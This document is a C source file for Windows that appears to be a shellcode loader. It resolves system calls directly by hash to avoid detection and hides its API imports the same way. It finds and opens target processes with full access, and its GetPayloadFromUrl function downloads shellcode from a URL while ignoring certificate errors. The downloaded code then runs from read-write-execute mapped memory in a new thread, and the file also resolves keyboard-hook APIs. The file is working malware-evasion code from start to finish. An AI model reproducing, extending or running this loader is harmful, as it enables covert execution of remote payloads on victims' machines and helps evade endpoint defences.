#include <Windows.h>

#include "Structs.h"
#include "Common.h"
#include "Debug.h"

VX_TABLE		g_Sys = { 0 };
API_HASHING		g_Api = { 0 };

BOOL InitializeSyscalls() {

	// Get the PEB
	PTEB pCurrentTeb = RtlGetThreadEnvironmentBlock();
	PPEB pCurrentPeb = pCurrentTeb->ProcessEnvironmentBlock;
	if (!pCurrentPeb || !pCurrentTeb || pCurrentPeb->OSMajorVersion != 0xA)
		return FALSE;

	// Get NTDLL module 
	PLDR_DATA_TABLE_ENTRY pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pCurrentPeb->Ldr->InMemoryOrderModuleList.Flink->Flink - 0x10);

	// Get the EAT of NTDLL
	PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;
	if (!GetImageExportDirectory(pLdrDataEntry->DllBase, &pImageExportDirectory) || pImageExportDirectory == NULL)
		return FALSE;

	g_Sys.NtCreateSection.uHash = NtCreateSection_JOAA;
	g_Sys.NtMapViewOfSection.uHash = NtMapViewOfSection_JOAA;
	g_Sys.NtUnmapViewOfSection.uHash = NtUnmapViewOfSection_JOAA;
	g_Sys.NtClose.uHash = NtClose_JOAA;
	g_Sys.NtCreateThreadEx.uHash = NtCreateThreadEx_JOAA;
	g_Sys.NtWaitForSingleObject.uHash = NtWaitForSingleObject_JOAA;
	g_Sys.NtQuerySystemInformation.uHash = NtQuerySystemInformation_JOAA;
	g_Sys.NtDelayExecution.uHash = NtDelayExecution_JOAA;

	// initialize the syscalls
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &g_Sys.NtCreateSection))
		return FALSE;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &g_Sys.NtMapViewOfSection))
		return FALSE;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &g_Sys.NtUnmapViewOfSection))
		return FALSE;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &g_Sys.NtClose))
		return FALSE;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &g_Sys.NtCreateThreadEx))
		return FALSE;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &g_Sys.NtWaitForSingleObject))
		return FALSE;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &g_Sys.NtQuerySystemInformation))
		return FALSE;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &g_Sys.NtDelayExecution))
		return FALSE;


	//	User32.dll exported
	g_Api.pCallNextHookEx = (fnCallNextHookEx)GetProcAddressH(GetModuleHandleH(USER32DLL_JOAA), CallNextHookEx_JOAA);
	g_Api.pDefWindowProcW = (fnDefWindowProcW)GetProcAddressH(GetModuleHandleH(USER32DLL_JOAA), DefWindowProcW_JOAA);
	g_Api.pGetMessageW = (fnGetMessageW)GetProcAddressH(GetModuleHandleH(USER32DLL_JOAA), GetMessageW_JOAA);
	g_Api.pSetWindowsHookExW = (fnSetWindowsHookExW)GetProcAddressH(GetModuleHandleH(USER32DLL_JOAA), SetWindowsHookExW_JOAA);
	g_Api.pUnhookWindowsHookEx = (fnUnhookWindowsHookEx)GetProcAddressH(GetModuleHandleH(USER32DLL_JOAA), UnhookWindowsHookEx_JOAA);

	if (g_Api.pCallNextHookEx == NULL || g_Api.pDefWindowProcW == NULL || g_Api.pGetMessageW == NULL || g_Api.pSetWindowsHookExW == NULL || g_Api.pUnhookWindowsHookEx == NULL)
		return FALSE;

	// 	Kernel32.dll exported
	g_Api.pGetModuleFileNameW = (fnGetModuleFileNameW)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), GetModuleFileNameW_JOAA);
	g_Api.pCloseHandle = (fnCloseHandle)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), CloseHandle_JOAA);
	g_Api.pCreateFileW = (fnCreateFileW)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), CreateFileW_JOAA);
	g_Api.pGetTickCount64 = (fnGetTickCount64)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), GetTickCount64_JOAA);
	g_Api.pOpenProcess = (fnOpenProcess)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), OpenProcess_JOAA);
	g_Api.pSetFileInformationByHandle = (fnSetFileInformationByHandle)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), SetFileInformationByHandle_JOAA);

	if (g_Api.pGetModuleFileNameW == NULL || g_Api.pCloseHandle == NULL || g_Api.pCreateFileW == NULL || g_Api.pGetTickCount64 == NULL || g_Api.pOpenProcess == NULL || g_Api.pSetFileInformationByHandle == NULL)
		return FALSE;

	return TRUE;
}

//-------------------------------------------------------------------------------------------------------------------------------------------------------------------//
//-------------------------------------------------------------------------------------------------------------------------------------------------------------------//


BOOL GetRemoteProcessHandle(IN LPCWSTR szProcName, IN DWORD* pdwPid, IN HANDLE* phProcess) {

	ULONG							uReturnLen1 = NULL,
		uReturnLen2 = NULL;
	PSYSTEM_PROCESS_INFORMATION		SystemProcInfo = NULL;
	PVOID							pValueToFree = NULL;
	NTSTATUS						STATUS = NULL;

	// this will fail (with status = STATUS_INFO_LENGTH_MISMATCH), but that's ok, because we need to know how much to allocate (uReturnLen1)
	EalsAte(g_Sys.NtQuerySystemInformation.wSystemCall);
	HellDescent(SystemProcessInformation, NULL, NULL, &uReturnLen1);

	// allocating enough buffer for the returned array of `SYSTEM_PROCESS_INFORMATION` struct
	SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)uReturnLen1);
	if (SystemProcInfo == NULL) {
		return FALSE;
	}

	// since we will modify 'SystemProcInfo', we will save its intial value before the while loop to free it later
	pValueToFree = SystemProcInfo;

	// calling NtQuerySystemInformation with the right arguments, the output will be saved to 'SystemProcInfo'
	EalsAte(g_Sys.NtQuerySystemInformation.wSystemCall);
	STATUS = HellDescent(SystemProcessInformation, SystemProcInfo, uReturnLen1, &uReturnLen2);
	if (STATUS != 0x0) {
#ifdef DEBUG
		PRINTA("[!] NtQuerySystemInformation Failed With Error : 0x%0.8X \n", STATUS);
#endif // DEBUG

		return FALSE;
	}

	while (TRUE) {

		// small check for the process's name size
		// comparing the enumerated process name to what we want to target
		if (SystemProcInfo->ImageName.Length && HASHW(SystemProcInfo->ImageName.Buffer) == HASHW(szProcName)) {
			// openning a handle to the target process and saving it, then breaking 
			*pdwPid = (DWORD)SystemProcInfo->UniqueProcessId;
			*phProcess = g_Api.pOpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)SystemProcInfo->UniqueProcessId);
			break;
		}

		// if NextEntryOffset is 0, we reached the end of the array
		if (!SystemProcInfo->NextEntryOffset)
			break;

		// moving to the next element in the array
		SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)SystemProcInfo + SystemProcInfo->NextEntryOffset);
	}

	// freeing using the initial address
	HeapFree(GetProcessHeap(), 0, pValueToFree);

	// checking if we got the target's process handle
	if (*pdwPid == NULL || *phProcess == NULL)
		return FALSE;
	else
		return TRUE;
}

//-------------------------------------------------------------------------------------------------------------------------------------------------------------------//
//-------------------------------------------------------------------------------------------------------------------------------------------------------------------//


// defining how does the function look - more on this structure in the api hashing part
typedef NTSTATUS(NTAPI* fnSystemFunction032)(
	struct USTRING* Img,
	struct USTRING* Key
	);


//-------------------------------------------------------------------------------------------------------------------------------------------------------------------//
//-------------------------------------------------------------------------------------------------------------------------------------------------------------------//


BOOL RemoteMappingInjectionViaSyscalls(IN HANDLE hProcess, IN HANDLE hMainThread, IN PVOID pPayload, IN SIZE_T sPayloadSize, IN BOOL bLocal) {

	HANDLE     hSection = NULL;
	HANDLE     hThread = NULL;
	PVOID      pLocalAddress = NULL;
	NTSTATUS   STATUS = NULL;
	SIZE_T     sViewSize = sPayloadSize;
	LARGE_INTEGER MaximumSize = { .HighPart = 0, .LowPart = sPayloadSize };

	// 1. Create section
	EalsAte(g_Sys.NtCreateSection.wSystemCall);
	if ((STATUS = HellDescent(&hSection, SECTION_ALL_ACCESS, NULL, &MaximumSize,
		PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)) != 0) {
#ifdef DEBUG
		PRINTA("[!] NtCreateSection failed: 0x%08X\n", STATUS);
#endif
		return FALSE;
	}

	// 2. Map section into self
	EalsAte(g_Sys.NtMapViewOfSection.wSystemCall);
	if ((STATUS = HellDescent(hSection, bLocal ? GetCurrentProcess() : hProcess, &pLocalAddress, NULL, NULL, NULL, &sViewSize,
		ViewUnmap, NULL, PAGE_EXECUTE_READWRITE)) != 0) {
#ifdef DEBUG
		PRINTA("[!] NtMapViewOfSection [local] failed: 0x%08X\n", STATUS);
#endif
		return FALSE;
	}

#ifdef DEBUG
	PRINTA("[+] Mapped into self at: 0x%p (size: %llu)\n", pLocalAddress, sViewSize);
#endif

	// 3. Copy shellcode
	_memcpy(pLocalAddress, pPayload, sPayloadSize);

	// 4. Decrypt (if needed)
	/*if (!Rc4EncryptionViSystemFunc032(EncRc4Key, pLocalAddress, KEY_SIZE, sPayloadSize)) {
		return FALSE;
	}*/

	// 5. Create thread in self
	PVOID pExecAddress = pLocalAddress;
	EalsAte(g_Sys.NtCreateThreadEx.wSystemCall);
	if ((STATUS = HellDescent(&hThread, THREAD_ALL_ACCESS, NULL, (HANDLE)-1,
		pExecAddress, NULL, FALSE, NULL, NULL, NULL, NULL)) != 0) {
#ifdef DEBUG
		PRINTA("[!] NtCreateThreadEx failed: 0x%08X\n", STATUS);
#endif
		return FALSE;
	}

#ifdef DEBUG
	PRINTA("[+] DONE \n");
	PRINTA("\t[+] Thread Created With Id : %d \n", GetThreadId(hThread));
#endif // DEBUG


	// waiting for the thread to finish
	EalsAte(g_Sys.NtWaitForSingleObject.wSystemCall);
	if ((STATUS = HellDescent(hThread, FALSE, NULL)) != 0) {
#ifdef DEBUG
		PRINTA("[!] NtWaitForSingleObject Failed With Error : 0x%0.8X \n", STATUS);
#endif // DEBUG
		return FALSE;
	}

	// unmpaing the local view
	EalsAte(g_Sys.NtUnmapViewOfSection.wSystemCall);
	if ((STATUS = HellDescent((HANDLE)-1, pLocalAddress)) != 0) {
#ifdef DEBUG
		PRINTA("[!] NtUnmapViewOfSection Failed With Error : 0x%0.8X \n", STATUS);
#endif // DEBUG
		return FALSE;
	}

	// closing the section handle
	EalsAte(g_Sys.NtClose.wSystemCall);
	if ((STATUS = HellDescent(hSection)) != 0) {
#ifdef DEBUG
		PRINTA("[!] NtClose Failed With Error : 0x%0.8X \n", STATUS);
#endif // DEBUG
		return FALSE;
	}

	return TRUE;
}

// Function to download payload
BOOL GetPayloadFromUrl(LPCWSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize) {
	BOOL bSTATE = TRUE;

#ifdef DEBUG
	PRINTW(L"[*] Downloading shellcode from: %s\n", szUrl);
#endif

	HINTERNET hInternet = NULL, hInternetFile = NULL;
	DWORD dwBytesRead = 0;
	SIZE_T sSize = 0;
	PBYTE pBytes = NULL, pTmpBytes = NULL;

	HMODULE hWinInet = LoadLibraryA("wininet.dll");
	if (!hWinInet)
		return FALSE;

	LPVOID(WINAPI * pInternetOpenW)(LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD) =
		(LPVOID)GetProcAddressH(hWinInet, HASHA("InternetOpenW"));

	LPVOID(WINAPI * pInternetOpenUrlW)(HINTERNET, LPCWSTR, LPCWSTR, DWORD, DWORD, DWORD_PTR) =
		(LPVOID)GetProcAddressH(hWinInet, HASHA("InternetOpenUrlW"));

	BOOL(WINAPI * pInternetReadFile)(HINTERNET, LPVOID, DWORD, LPDWORD) =
		(BOOL(WINAPI*)(HINTERNET, LPVOID, DWORD, LPDWORD))GetProcAddressH(hWinInet, HASHA("InternetReadFile"));

	BOOL(WINAPI * pInternetCloseHandle)(HINTERNET) =
		(BOOL(WINAPI*)(HINTERNET))GetProcAddressH(hWinInet, HASHA("InternetCloseHandle"));

	if (!pInternetOpenW || !pInternetOpenUrlW || !pInternetReadFile || !pInternetCloseHandle)
		return FALSE;

	HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");

	LPVOID(WINAPI * pLocalAlloc)(UINT, SIZE_T) =
		(LPVOID(WINAPI*)(UINT, SIZE_T))GetProcAddressH(hKernel32, HASHA("LocalAlloc"));
	LPVOID(WINAPI * pLocalReAlloc)(LPVOID, SIZE_T, UINT) =
		(LPVOID(WINAPI*)(LPVOID, SIZE_T, UINT))GetProcAddressH(hKernel32, HASHA("LocalReAlloc"));
	VOID(WINAPI * pLocalFree)(LPVOID) =
		(VOID(WINAPI*)(LPVOID))GetProcAddressH(hKernel32, HASHA("LocalFree"));

	if (!pLocalAlloc || !pLocalReAlloc || !pLocalFree)
		return FALSE;

	hInternet = pInternetOpenW(L"Loader", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
	if (!hInternet) {
		bSTATE = FALSE;
		goto _End;
	}

	hInternetFile = pInternetOpenUrlW(hInternet, szUrl, NULL, 0,
		INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | INTERNET_FLAG_NO_CACHE_WRITE,
		0);
	if (!hInternetFile) {
		bSTATE = FALSE;
		goto _End;
	}

	pTmpBytes = (PBYTE)pLocalAlloc(LPTR, 1024);
	if (!pTmpBytes) {
		bSTATE = FALSE;
		goto _End;
	}

	while (TRUE) {
		if (!pInternetReadFile(hInternetFile, pTmpBytes, 1024, &dwBytesRead)) {
			bSTATE = FALSE;
			goto _End;
		}
		if (dwBytesRead == 0)
			break;

		sSize += dwBytesRead;
		if (!pBytes)
			pBytes = (PBYTE)pLocalAlloc(LPTR, sSize);
		else
			pBytes = (PBYTE)pLocalReAlloc(pBytes, sSize, LMEM_MOVEABLE | LMEM_ZEROINIT);

		if (!pBytes) {
			bSTATE = FALSE;
			goto _End;
		}
		_memcpy(pBytes + (sSize - dwBytesRead), pTmpBytes, dwBytesRead);
	}

	*pPayloadBytes = pBytes;
	*sPayloadSize = sSize;

#ifdef DEBUG
	PRINTA("[+] Downloaded shellcode: %llu bytes\n", sSize);
	if (sSize >= 10) {
		PRINTA("[*] First 10 bytes of payload:\n");
		for (int i = 0; i < 10; i++) {
			PRINTA("%02X ", ((unsigned char*)pBytes)[i]);
		}
		PRINTA("\n");
	}
#endif

_End:
	if (hInternetFile) pInternetCloseHandle(hInternetFile);
	if (hInternet) pInternetCloseHandle(hInternet);
	if (pTmpBytes) pLocalFree(pTmpBytes);

	return bSTATE;
}
